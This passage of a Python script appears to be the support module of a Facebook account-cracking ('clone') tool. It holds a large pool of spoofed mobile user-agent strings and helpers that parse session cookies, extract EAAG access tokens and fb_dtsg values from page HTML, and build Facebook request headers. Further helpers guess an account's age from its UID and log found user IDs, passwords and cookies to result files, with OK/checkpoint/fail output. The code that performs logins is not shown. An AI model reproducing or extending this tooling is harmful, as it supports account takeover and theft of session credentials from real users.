  "Mozilla/5.0 (Linux; Android 9; CPH2269) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.7531.139 Mobile Safari/537.36",
  "Mozilla/5.0 (Linux; Android 10; SM-A525F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.7548.146 Mobile Safari/537.36",
  "Mozilla/5.0 (Linux; Android 11; SM-A536B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/111.0.7565.153 Mobile Safari/537.36",
  "Mozilla/5.0 (Linux; Android 12; SM-A546B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.7582.160 Mobile Safari/537.36",
  "Mozilla/5.0 (Linux; Android 13; SM-G991B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.7599.167 Mobile Safari/537.36",
  "Mozilla/5.0 (Linux; Android 14; SM-G998B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.7616.174 Mobile Safari/537.36",
  "Mozilla/5.0 (Linux; Android 9; SM-S908B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.7633.181 Mobile Safari/537.36",
  "Mozilla/5.0 (Linux; Android 10; SM-A125F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.7650.188 Mobile Safari/537.36",
  "Mozilla/5.0 (Linux; Android 11; SM-A135F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/117.0.7667.195 Mobile Safari/537.36",
  "Mozilla/5.0 (Linux; Android 12; SM-A215U) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.7684.202 Mobile Safari/537.36",
  "Mozilla/5.0 (Linux; Android 13; SM-A225F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.7701.209 Mobile Safari/537.36",
  "Mozilla/5.0 (Linux; Android 14; SM-A235F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.7718.216 Mobile Safari/537.36",
  "Mozilla/5.0 (Linux; Android 9; SM-A325F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.7735.223 Mobile Safari/537.36",
  "Mozilla/5.0 (Linux; Android 10; SM-A326B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.7752.230 Mobile Safari/537.36",
  "Mozilla/5.0 (Linux; Android 11; SM-A336B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.7769.237 Mobile Safari/537.36",
  "Mozilla/5.0 (Linux; Android 12; SM-A426B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.7786.244 Mobile Safari/537.36",
  "Mozilla/5.0 (Linux; Android 13; SM-A526B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.7803.51 Mobile Safari/537.36",
  "Mozilla/5.0 (Linux; Android 14; SM-A736B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/106.0.7820.58 Mobile Safari/537.36",
  "Mozilla/5.0 (Linux; Android 9; CPH2451) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.7837.65 Mobile Safari/537.36",
  "Mozilla/5.0 (Linux; Android 10; CPH2461) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.7854.72 Mobile Safari/537.36",
  "Mozilla/5.0 (Linux; Android 11; CPH2473) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.7871.79 Mobile Safari/537.36",
  "Mozilla/5.0 (Linux; Android 12; CPH2381) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.7888.86 Mobile Safari/537.36",
  "Mozilla/5.0 (Linux; Android 13; CPH2239) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/111.0.7905.93 Mobile Safari/537.36",
  "Mozilla/5.0 (Linux; Android 14; CPH2285) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.7922.100 Mobile Safari/537.36",
  "Mozilla/5.0 (Linux; Android 9; CPH2251) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.7939.107 Mobile Safari/537.36",
  "Mozilla/5.0 (Linux; Android 10; CPH2219) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.7956.114 Mobile Safari/537.36",
  "Mozilla/5.0 (Linux; Android 11; CPH2171) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.7973.121 Mobile Safari/537.36",
  "Mozilla/5.0 (Linux; Android 12; RMX3371) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.7990.128 Mobile Safari/537.36",
  "Mozilla/5.0 (Linux; Android 13; RMX3516) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/117.0.8007.135 Mobile Safari/537.36",
  "Mozilla/5.0 (Linux; Android 14; RMX3461) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.8024.142 Mobile Safari/537.36",
  "Mozilla/5.0 (Linux; Android 9; RMX3286) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.8041.149 Mobile Safari/537.36",
  "Mozilla/5.0 (Linux; Android 10; RMX3561) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.8058.156 Mobile Safari/537.36",
  "Mozilla/5.0 (Linux; Android 11; RMX2193) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.8075.163 Mobile Safari/537.36",
  "Mozilla/5.0 (Linux; Android 12; RMX2151) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.8092.170 Mobile Safari/537.36",
  "Mozilla/5.0 (Linux; Android 13; RMX3085) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.8109.177 Mobile Safari/537.36",
  "Mozilla/5.0 (Linux; Android 14; Infinix X689C) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.8126.184 Mobile Safari/537.36",
  "Mozilla/5.0 (Linux; Android 9; Infinix X676C) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.8143.191 Mobile Safari/537.36",
  "Mozilla/5.0 (Linux; Android 10; Infinix X665B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/106.0.8160.198 Mobile Safari/537.36",
  "Mozilla/5.0 (Linux; Android 11; Infinix X6817) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.8177.205 Mobile Safari/537.36",
  "Mozilla/5.0 (Linux; Android 12; 2201116SR) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.8194.212 Mobile Safari/537.36",
  "Mozilla/5.0 (Linux; Android 13; 2201123G) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.8211.219 Mobile Safari/537.36",
  "Mozilla/5.0 (Linux; Android 14; 22041219I) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.8228.226 Mobile Safari/537.36",
  "Mozilla/5.0 (Linux; Android 9; 22011119TI) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/111.0.8245.233 Mobile Safari/537.36",
  "Mozilla/5.0 (Linux; Android 10; M2101K9AG) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.8262.240 Mobile Safari/537.36",
  "Mozilla/5.0 (Linux; Android 11; M2102K1G) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.8279.247 Mobile Safari/537.36",
  "Mozilla/5.0 (Linux; Android 12; 22081212C) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.8296.54 Mobile Safari/537.36",
  "Mozilla/5.0 (Linux; Android 13; Pixel 6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.8313.61 Mobile Safari/537.36",
  "Mozilla/5.0 (Linux; Android 14; Pixel 6a) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.8330.68 Mobile Safari/537.36",
  "Mozilla/5.0 (Linux; Android 9; Pixel 7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/117.0.8347.75 Mobile Safari/537.36",
  "Mozilla/5.0 (Linux; Android 10; Pixel 7 Pro) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.8364.82 Mobile Safari/537.36",
  "Mozilla/5.0 (Linux; Android 11; Pixel 8) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.8381.89 Mobile Safari/537.36",
  "Mozilla/5.0 (Linux; Android 12; Pixel 8 Pro) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.8398.96 Mobile Safari/537.36",
  "Mozilla/5.0 (Linux; Android 13; CPH1869) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.8415.103 Mobile Safari/537.36",
  "Mozilla/5.0 (Linux; Android 14; CPH2083) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.8432.110 Mobile Safari/537.36",
  "Mozilla/5.0 (Linux; Android 9; CPH2107) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.8449.117 Mobile Safari/537.36",
  "Mozilla/5.0 (Linux; Android 10; CPH2269) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.8466.124 Mobile Safari/537.36",
  "Mozilla/5.0 (Linux; Android 11; SM-A525F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.8483.131 Mobile Safari/537.36",
  "Mozilla/5.0 (Linux; Android 12; SM-A536B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/106.0.8500.138 Mobile Safari/537.36",
  "Mozilla/5.0 (Linux; Android 13; SM-A546B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.8517.145 Mobile Safari/537.36",
  "Mozilla/5.0 (Linux; Android 14; SM-G991B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.8534.152 Mobile Safari/537.36",
  "Mozilla/5.0 (Linux; Android 9; SM-G998B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.8551.159 Mobile Safari/537.36",
  "Mozilla/5.0 (Linux; Android 10; SM-S908B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.8568.166 Mobile Safari/537.36",
  "Mozilla/5.0 (Linux; Android 11; SM-A125F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/111.0.8585.173 Mobile Safari/537.36",
  "Mozilla/5.0 (Linux; Android 12; SM-A135F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.8602.180 Mobile Safari/537.36",
  "Mozilla/5.0 (Linux; Android 13; SM-A215U) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.8619.187 Mobile Safari/537.36",
  "Mozilla/5.0 (Linux; Android 14; SM-A225F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.8636.194 Mobile Safari/537.36",
  "Mozilla/5.0 (Linux; Android 9; SM-A235F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.8653.201 Mobile Safari/537.36",
  "Mozilla/5.0 (Linux; Android 10; SM-A325F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.8670.208 Mobile Safari/537.36",
  "Mozilla/5.0 (Linux; Android 11; SM-A326B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/117.0.8687.215 Mobile Safari/537.36",
  "Mozilla/5.0 (Linux; Android 12; SM-A336B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.8704.222 Mobile Safari/537.36",
  "Mozilla/5.0 (Linux; Android 13; SM-A426B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.8721.229 Mobile Safari/537.36",
  "Mozilla/5.0 (Linux; Android 14; SM-A526B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.8738.236 Mobile Safari/537.36",
  "Mozilla/5.0 (Linux; Android 9; SM-A736B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.8755.243 Mobile Safari/537.36",
  "Mozilla/5.0 (Linux; Android 10; CPH2451) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.8772.50 Mobile Safari/537.36",
  "Mozilla/5.0 (Linux; Android 11; CPH2461) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.8789.57 Mobile Safari/537.36",
  "Mozilla/5.0 (Linux; Android 12; CPH2473) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.8806.64 Mobile Safari/537.36",
  "Mozilla/5.0 (Linux; Android 13; CPH2381) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.8823.71 Mobile Safari/537.36",
  "Mozilla/5.0 (Linux; Android 14; CPH2239) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/106.0.8840.78 Mobile Safari/537.36",
  "Mozilla/5.0 (Linux; Android 9; CPH2285) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.8857.85 Mobile Safari/537.36",
  "Mozilla/5.0 (Linux; Android 10; CPH2251) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.8874.92 Mobile Safari/537.36",
  "Mozilla/5.0 (Linux; Android 11; CPH2219) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.8891.99 Mobile Safari/537.36",
  "Mozilla/5.0 (Linux; Android 12; CPH2171) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.8908.106 Mobile Safari/537.36",
  "Mozilla/5.0 (Linux; Android 13; RMX3371) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/111.0.8925.113 Mobile Safari/537.36",
  "Mozilla/5.0 (Linux; Android 14; RMX3516) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.8942.120 Mobile Safari/537.36",
  "Mozilla/5.0 (Linux; Android 9; RMX3461) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.8959.127 Mobile Safari/537.36",
  "Mozilla/5.0 (Linux; Android 10; RMX3286) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.8976.134 Mobile Safari/537.36",
  "Mozilla/5.0 (Linux; Android 11; RMX3561) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.8993.141 Mobile Safari/537.36",
  "Mozilla/5.0 (Linux; Android 12; RMX2193) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.9010.148 Mobile Safari/537.36",
  "Mozilla/5.0 (Linux; Android 13; RMX2151) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/117.0.9027.155 Mobile Safari/537.36",
  "Mozilla/5.0 (Linux; Android 14; RMX3085) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.9044.162 Mobile Safari/537.36",
  "Mozilla/5.0 (Linux; Android 9; Infinix X689C) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.9061.169 Mobile Safari/537.36",
  "Mozilla/5.0 (Linux; Android 10; Infinix X676C) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.9078.176 Mobile Safari/537.36",
  "Mozilla/5.0 (Linux; Android 11; Infinix X665B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.9095.183 Mobile Safari/537.36",
  "Mozilla/5.0 (Linux; Android 12; Infinix X6817) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.9112.190 Mobile Safari/537.36",
  "Mozilla/5.0 (Linux; Android 13; 2201116SR) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.9129.197 Mobile Safari/537.36",
  "Mozilla/5.0 (Linux; Android 14; 2201123G) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.9146.204 Mobile Safari/537.36",
  "Mozilla/5.0 (Linux; Android 9; 22041219I) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.9163.211 Mobile Safari/537.36",
  "Mozilla/5.0 (Linux; Android 10; 22011119TI) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/106.0.9180.218 Mobile Safari/537.36",
  "Mozilla/5.0 (Linux; Android 11; M2101K9AG) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.9197.225 Mobile Safari/537.36",
  "Mozilla/5.0 (Linux; Android 12; M2102K1G) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.9214.232 Mobile Safari/537.36",
  "Mozilla/5.0 (Linux; Android 13; 22081212C) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.9231.239 Mobile Safari/537.36",
  "Mozilla/5.0 (Linux; Android 14; Pixel 6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.9248.246 Mobile Safari/537.36",
  "Mozilla/5.0 (Linux; Android 9; Pixel 6a) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/111.0.9265.53 Mobile Safari/537.36",
  "Mozilla/5.0 (Linux; Android 10; Pixel 7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.9282.60 Mobile Safari/537.36",
  "Mozilla/5.0 (Linux; Android 11; Pixel 7 Pro) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.9299.67 Mobile Safari/537.36",
  "Mozilla/5.0 (Linux; Android 12; Pixel 8) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.9316.74 Mobile Safari/537.36",
  "Mozilla/5.0 (Linux; Android 13; Pixel 8 Pro) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.9333.81 Mobile Safari/537.36",
  "Mozilla/5.0 (Linux; Android 14; CPH1869) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.9350.88 Mobile Safari/537.36",
  "Mozilla/5.0 (Linux; Android 9; CPH2083) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/117.0.9367.95 Mobile Safari/537.36",
  "Mozilla/5.0 (Linux; Android 10; CPH2107) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.9384.102 Mobile Safari/537.36",
  "Mozilla/5.0 (Linux; Android 11; CPH2269) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.9401.109 Mobile Safari/537.36",
  "Mozilla/5.0 (Linux; Android 12; SM-A525F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.9418.116 Mobile Safari/537.36",
  "Mozilla/5.0 (Linux; Android 13; SM-A536B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.9435.123 Mobile Safari/537.36",
  "Mozilla/5.0 (Linux; Android 14; SM-A546B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.9452.130 Mobile Safari/537.36",
  "Mozilla/5.0 (Linux; Android 9; SM-G991B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.9469.137 Mobile Safari/537.36",
  "Mozilla/5.0 (Linux; Android 10; SM-G998B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.9486.144 Mobile Safari/537.36",
]

def get_static_ua() -> str:
    return random.choice(_STATIC_UA_POOL)

def get_best_ua() -> str:
    try: return ugenX()
    except Exception: return get_static_ua()


# ============================================================
#  COOKIE & ACCOUNT HELPERS
# ============================================================

def format_cookie_str(cookie_dict: dict) -> str:
    """Convert cookie dict to semicolon string."""
    return "; ".join(f"{k}={v}" for k, v in cookie_dict.items())

def parse_cookie_str_ext(cookie_str: str) -> dict:
    """Parse semicolon cookie string to dict."""
    _out = {}
    for _p in cookie_str.split(";"):
        _p = _p.strip()
        if "=" in _p:
            _k, _v = _p.split("=", 1)
            _out[_k.strip()] = _v.strip()
    return _out

def validate_cookie(c: dict) -> bool:
    return "c_user" in c and "xs" in c

def mask_uid(uid: str) -> str:
    if len(uid) < 6: return uid
    return uid[:3] + "*" * (len(uid) - 6) + uid[-3:]

def mask_password(pw: str) -> str:
    if len(pw) <= 2: return "*" * len(pw)
    return pw[0] + "*" * (len(pw) - 2) + pw[-1]

def safe_int_ext(value, default: int = 0) -> int:
    try: return int(str(value).strip())
    except: return default

def safe_json_ext(text: str) -> dict:
    try:
        import json as _j; return _j.loads(text)
    except: return {}

def read_lines_ext(filepath: str) -> list:
    try:
        with open(filepath, "r", encoding="utf-8") as _f:
            return [l.strip() for l in _f if l.strip()]
    except: return []

def write_line_ext(filepath: str, line: str) -> bool:
    try:
        with open(filepath, "a", encoding="utf-8") as _f:
            _f.write(line + "\n")
        return True
    except: return False

def load_cookies_ext(filepath: str) -> list:
    _res = []
    for _l in read_lines_ext(filepath):
        if "|" in _l:
            _parts = _l.split("|")
            if len(_parts) >= 3:
                _c = parse_cookie_str_ext(_parts[2])
                if _c: _res.append(_c)
        else:
            _c = parse_cookie_str_ext(_l)
            if _c: _res.append(_c)
    return _res

def filter_valid_cookies_ext(cookie_list: list) -> list:
    return [c for c in cookie_list if validate_cookie(c)]

def deduplicate_cookies_ext(cookie_list: list) -> list:
    _seen = set(); _out = []
    for _c in cookie_list:
        _uid = _c.get("c_user", "")
        if _uid and _uid not in _seen:
            _seen.add(_uid); _out.append(_c)
    return _out

def extract_eaag_token(html: str) -> str:
    _m = re.search(r'(EAAG\w+)', html)
    return _m.group(1) if _m else ""

def extract_dtsg(html: str) -> str:
    for _pat in [r'"fb_dtsg","([^"]+)"', r'name="fb_dtsg" value="([^"]+)"']:
        _m = re.search(_pat, html)
        if _m: return _m.group(1)
    return ""

def build_fb_headers(ua: str = None) -> dict:
    if not ua: ua = get_best_ua()
    return {"User-Agent": ua, "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8", "Accept-Language": "en-US,en;q=0.9", "Referer": "https://www.facebook.com/", "Connection": "keep-alive"}

def build_api_headers_ext(ua: str = None) -> dict:
    if not ua: ua = get_best_ua()
    return {"User-Agent": ua, "Content-Type": "application/x-www-form-urlencoded", "Accept": "application/json", "X-FB-HTTP-Engine": "Liger"}

def estimate_age(uid: str) -> str:
    _u = str(uid)
    if len(_u) in (9,10): return "2008"
    if len(_u) == 8: return "2007"
    if len(_u) == 7: return "2006"
    if len(_u) == 15:
        if _u.startswith("100000000"): return "2009"
        if _u.startswith("100001"): return "2010"
        if _u.startswith(("100002","100003")): return "2011"
        if _u.startswith("100004"): return "2012"
        if _u.startswith(("100005","100006")): return "2013"
        if _u.startswith(("100007","100008")): return "2014"
        if _u.startswith("100009"): return "2015"
        if _u.startswith("10001"): return "2016"
        if _u.startswith("10002"): return "2017"
        if _u.startswith("10003"): return "2018"
        if _u.startswith("10004"): return "2019"
        if _u.startswith("10005"): return "2020"
        if _u.startswith("10006"): return "2021"
        if _u.startswith(("10007","10008")): return "2022"
        if _u.startswith("10009"): return "2023"
    if len(_u) == 14 and _u.startswith("61"): return "2024"
    return "unknown"


# ============================================================
#  ACCOUNT STORAGE
# ============================================================

_RESULT_DIR = os.path.expanduser("~/AU2_Results")
os.makedirs(_RESULT_DIR, exist_ok=True)

def save_account_ext(uid: str, pw: str, cookie_str: str = "", tag: str = "AU2") -> bool:
    _ts  = datetime.now().strftime("%Y%m%d")
    _log = os.path.join(_RESULT_DIR, f"{tag}_{_ts}.txt")
    try:
        with open(_log, "a", encoding="utf-8") as _f:
            _f.write(f"{uid}|{pw}|{cookie_str}\n" if cookie_str else f"{uid}|{pw}\n")
        return True
    except: return False

def save_clone_ext(uid: str, pw: str, year: str = "") -> bool:
    return save_account_ext(uid, pw, year, "FB_CLONE")

def load_accounts_ext(filepath: str) -> list:
    _out = []
    for _l in read_lines_ext(filepath):
        _p = _l.split("|")
        if len(_p) >= 2:
            _out.append((_p[0], _p[1], _p[2] if len(_p) > 2 else ""))
    return _out

def results_dir_summary() -> str:
    _lines = [f"  Results: {_RESULT_DIR}"]
    try:
        for _fn in sorted(os.listdir(_RESULT_DIR)):
            if _fn.endswith(".txt"):
                _c = sum(1 for _ in open(os.path.join(_RESULT_DIR,_fn), errors='ignore'))
                _lines.append(f"    {_fn:<45}  {_c:>5} lines")
    except Exception as _e: _lines.append(f"    Error: {_e}")
    return "\n".join(_lines)


# ============================================================
#  DISPLAY / UI HELPERS
# ============================================================

def print_header_box(title: str, subtitle: str = "", width: int = 60) -> None:
    _bar = "─" * width
    print(f"{GOLD}  ┌{_bar}┐{RESET}")
    print(f"{GOLD}  │  {BOLD}{W}{title:<{width-2}}{RESET}{GOLD}  │{RESET}")
    if subtitle:
        print(f"{GOLD}  │  {D}{subtitle:<{width-2}}{RESET}{GOLD}  │{RESET}")
    print(f"{GOLD}  └{_bar}┘{RESET}")

def print_kv_ext(key: str, value: str, kc: str = None, vc: str = None) -> None:
    print(f"{GOLD}  ■  {kc or TEAL}{BOLD}{key:<16}{RESET}{D} | {vc or W}{value}{RESET}")

def print_ok(uid: str, pw: str, extra: str = "") -> None:
    print(f"{G}  {BOLD}[+]  UID: {uid}  |  PW: {mask_password(pw)}{('  |  '+extra) if extra else ''}{RESET}")

def print_cp(uid: str) -> None:
    print(f"{Y}  [!]  CP: {uid}{RESET}")

def print_fail(reason: str = "") -> None:
    print(f"{R}  [-]  FAIL{(' — '+reason) if reason else ''}{RESET}")

def print_prog(cur: int, tot: int, ok: int, fail: int) -> None:
    _pct = int(cur/tot*100) if tot > 0 else 0
    _fl  = int(20*cur/tot)  if tot > 0 else 0
    _bar = "#"*_fl + "-"*(20-_fl)
    sys.stdout.write(f"\r{GOLD}  [{_bar}] {_pct:3}%  {W}{cur}/{tot}  {G}OK:{ok}  {R}FAIL:{fail}  {RESET}")
    sys.stdout.flush()

def print_done_ext(ok: int, fail: int, label: str = "DONE") -> None:
    print(f"\n{GOLD}  {'─'*60}{RESET}")
    print(f"{G}  {BOLD}[+]  {label} — OK: {ok}  |  FAIL: {fail}{RESET}")
    print(f"{GOLD}  {'─'*60}{RESET}")

def confirm_yn(prompt_text: str) -> bool:
    _a = input(f"{GOLD}  ▶ {TEAL}{BOLD}{prompt_text} (y/n){W} :{G} {RESET}").strip().lower()
    return _a in ("y","yes","1")

def get_int(prompt_text: str, min_val: int = 1, max_val: int = 999999) -> int:
    while True:
        try:
            _v = int(input(f"{GOLD}  ▶ {TEAL}{BOLD}{prompt_text}{W} :{G} {RESET}").strip())
            if min_val <= _v <= max_val: return _v
            print(f"{R}  [-]  Enter {min_val}–{max_val}{RESET}")
        except ValueError: print(f"{R}  [-]  Numbers only{RESET}")

def get_str(prompt_text: str, allow_empty: bool = False) -> str:
    while True:
        _v = input(f"{GOLD}  ▶ {TEAL}{BOLD}{prompt_text}{W} :{G} {RESET}").strip()
        if _v or allow_empty: return _v
        print(f"{R}  [-]  Cannot be empty{RESET}")


# ============================================================
#  UTILITY FUNCTIONS
# ============================================================

def is_valid_uid(uid: str) -> bool:
    return uid.isdigit() and 6 <= len(uid) <= 20

def is_valid_email(email: str) -> bool:
    return bool(re.match(r"^[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}$", email))

def is_valid_phone(phone: str) -> bool:
    return bool(re.match(r"^\+?[0-9]{7,15}$", phone.replace(" ","").replace("-","")))

def generate_random_email() -> str:
    _u = "".join(random.choices("abcdefghijklmnopqrstuvwxyz0123456789", k=random.randint(6,12)))
    _d = random.choice(["gmail","yahoo","hotmail","outlook","proton"])
    _t = random.choice(["com","net","org","io"])
    return f"{_u}@{_d}.{_t}"

def generate_strong_password(length: int = 12) -> str:
    _chars = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789!@#$%^&*"
    _pw = [random.choice("ABCDEFGHIJKLMNOPQRSTUVWXYZ"),random.choice("0123456789"),random.choice("!@#$%^&*")]
    _pw += [random.choice(_chars) for _ in range(max(0,length-3))]
    random.shuffle(_pw)
    return "".join(_pw)

def generate_birthday(min_age: int = 18, max_age: int = 40) -> dict:
    from datetime import date as _d
    _y = _d.today().year - random.randint(min_age, max_age)
    return {"day": str(random.randint(1,28)), "month": str(random.randint(1,12)), "year": str(_y)}

def random_gender_code() -> str:
    return random.choice(["1","2"])

def get_unix_ts() -> int:
    import time as _t; return int(_t.time())

def get_unix_ms() -> int:
    import time as _t; return int(_t.time()*1000)

def format_file_size(n: int) -> str:
    for _u in ["B","KB","MB","GB","TB"]:
        if n < 1024: return f"{n:.1f} {_u}"
        n //= 1024
    return f"{n:.1f} PB"

def format_hms(secs: int) -> str:
    _h = secs//3600; _m = (secs%3600)//60; _s = secs%60
    return f"{_h:02d}:{_m:02d}:{_s:02d}"

def strip_ansi(text: str) -> str:
    return re.sub(r"\033\[[0-9;]*m","",text)

def chunk_list(lst: list, n: int) -> list:
    return [lst[i:i+n] for i in range(0,len(lst),n)]

def flatten_list(nested: list) -> list:
    return [item for sub in nested for item in sub]

def unique_list(lst: list) -> list:
    _s=set(); return [x for x in lst if not(x in _s or _s.add(x))]

def rotate_list(lst: list, n: int) -> list:
    if not lst: return lst
    _n=n%len(lst); return lst[_n:]+lst[:_n]

def invert_dict(d: dict) -> dict:
    return {v:k for k,v in d.items()}

def merge_dicts(*dicts) -> dict:
    _o={}
    for _d in dicts: _o.update(_d)
    return _o

def clamp_val(value, mn, mx):
    return max(mn,min(mx,value))

def pct(part: int, total: int) -> float:
    return round(part/total*100,2) if total>0 else 0.0

def random_hex_str(n: int = 8) -> str:
    return "".join(random.choices("0123456789abcdef",k=n))

def sha256_hash(s: str) -> str:
    import hashlib as _h; return _h.sha256(s.encode()).hexdigest()

def md5_hash(s: str) -> str:
    import hashlib as _h; return _h.md5(s.encode()).hexdigest()

def http_get_simple(url: str, timeout: int = 10) -> str:
    try:
        import requests as _r; return _r.get(url,timeout=timeout).text
    except: return ""

def sleep_ext(seconds: float) -> None:
    import time as _t; _t.sleep(seconds)

def clear_term() -> None:
    import os as _o,platform as _p
    _o.system("cls" if _p.system().lower()=="windows" else "clear")

def remove_spaces_ext(s: str) -> str:
    return "".join(s.split())

def word_count_ext(s: str) -> int:
    return len(s.split())

def bool_yn(b: bool) -> str:
    return "Y" if b else "N"

def yn_bool(s: str) -> bool:
    return s.strip().upper() in ("Y","YES","1","TRUE")

def now_str_ext() -> str:
    from datetime import datetime as _dt; return _dt.now().strftime("%Y-%m-%d %H:%M:%S")

def date_str_ext() -> str:
    from datetime import datetime as _dt; return _dt.now().strftime("%Y-%m-%d")

def zip_two(a: list, b: list) -> list:
    return list(zip(a,b))

def dict_pairs(d: dict) -> list:
    return list(d.items())

